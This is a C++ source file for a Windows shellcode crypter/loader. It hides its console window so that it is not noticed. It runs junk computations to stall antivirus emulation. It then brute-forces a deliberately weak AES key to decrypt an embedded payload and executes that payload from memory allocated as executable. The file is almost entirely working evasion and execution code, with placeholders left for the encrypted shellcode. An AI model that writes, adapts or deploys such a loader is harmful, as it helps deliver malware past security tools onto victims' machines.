#include "cryptopp/aes.h"
#include "cryptopp/filters.h"
#include "cryptopp/hex.h"
#include "cryptopp/modes.h"
#include "stdafx.h"
#include <Windows.h> //vAlloc (doIt)
#include <iostream>
#include <stdlib.h> //piMonteCarlo
#include <string.h>
#include <time.h> //piMonteCarlo

// 16 Bytes --> AES-128
#define K_LEN 16
// How many times we will use the junk code to factorize primes
#define LOOP_COUNT_PRIM 7550

using namespace std;
using namespace CryptoPP;

// prototypes of the main-functions
void incr(byte* b);
void doIt();
void dec();
void stlth();

// prototypes of the junk-functions
double piMonteCarlo();
int prim(unsigned long z);

string recovered;
// placeholders for the data - see crypter.py for more info
const char cphr[] = "PUTYOURCIPHERHERE!!1!";
// we use a marker to determine if it really is the decrpyted code we want
const string mrkr = "PUTYOURMARKERHERE!!1!";
// the key
byte ky[] = "0000000000370000";

int _tmain(int argc, _TCHAR* argv[])
{
    // first, hide the window because otherwise it would be suspicious :)
    stlth();

    // use some time
    cout << piMonteCarlo() << endl;
    unsigned long int someInt = 1;
    for (int i = 0; i <= LOOP_COUNT_PRIM; i++) {
        prim(someInt);
        someInt++;
    }

    // Main-Code: decrypt first and then run the code
    dec();
    doIt();
    return 0;
}

// used to get the next key to be tested
void incr(byte* b)
{
    // always increment the last number
    b[K_LEN - 1]++;
    for (int i = K_LEN - 2; i >= 0; i--) {
        // if the number on the right to another number will be over 9
        // then increment the neighbour number so we loop over the possible
        // keys
        if (b[i + 1] > '9') {
            b[i]++;
            b[i + 1] = '0';
        }
    }
}

// invokes the code we decrypted
void doIt()
{
    // get a new executable page because we cant just invoke the data in the
    // recovered-var because of DEP (Data Execution Prevention)
    void* thePage = VirtualAlloc(
        0, strlen(recovered.c_str()) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    // copy the decrypted code into the page
    memcpy(thePage, recovered.c_str(), strlen(recovered.c_str()) + 1);
    // invoke the code by casting it to void* and calling it
    ((void (*)())thePage)();
}

// decryption
void dec()
{
    bool found = false;

    // First we define the decryption-object.
    // Unlike when encryption took place, we dont know the key yet
    ECB_Mode<AES>::Decryption d;
    while (!found) {
        recovered = "";
        // cout << "trying " << ky << endl;

        // set the current tested key
        d.SetKey(ky, K_LEN);

        try {
            // We use the crypto++ pipelining paradigm:
            // Processing takes place from the source, over a filter into a
            // sink.

            // So we first define the source of the data - the StringSource
            // using the ciphertext, a boolean value of true
            // (pumpAll --> all data will be passed to the next stage at once)
            // and a HexDecoder because we know that the data was processed by
            // a HexEncoder previously (see encryptShellcode).
            StringSource src(cphr, true,
                // Before the data can be decrypted, we have to pass the data
                // to the HexDecoder first because it was HexEncoder before for
                // portability
                new HexDecoder(
                    // The StreamTransformationFilter uses the previusly
                    // defined decryption object to decrypt the data of the
                    // source. It will also handle padding.
                    new StreamTransformationFilter(d,
                        // If it worked, the decrypted data will be in the
                        // recovered-var
                        new StringSink(recovered))));
        }
        // if it was the wrong key
        catch (InvalidCiphertext e) {
            incr(ky);
            continue;
        }
        // if some other error occured
        catch (Exception& e) {
            cerr << e.what() << endl;
            exit(1);
        }
        // check the marker
        if (recovered.find(mrkr) == string::npos) {
            incr(ky);
            continue;
        } else
            found = true;
    }
}

// create unshown window --> stealth
void stlth()
{
    HWND nW;
    AllocConsole();
    nW = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(nW, 0);
}

/////////////////////////////////////////////
// the junk-code is below
/////////////////////////////////////////////

// factorizing primes
int prim(unsigned long int z)
{
    if (z < 2)
        return -1;
    int bkp = 0;
    int i = 2;
    while (z > 1) {
        if ((z % i) == 0) {
            z /= i;
            if (bkp == i)
                return bkp;
            else
                cout << i << endl;
        } else
            i++;
    }
    return z;
}

// calculate pi by using a monte-carlo-algorithm
double piMonteCarlo()
{
    srand((unsigned int)time(NULL));
    double pi = 0;
    long ht = 0;
    double sht = 0;
    int x = 0;
    int y = 0;
    for (sht = 1; sht < 99999999; sht += 0.1) {
        sht++;
        x = rand() % 2;
        y = rand() % 2;
        if ((x * x) + (y * y) <= 1)
            ht++;
    }
    pi = (ht / sht) * 4;
    return pi;
}
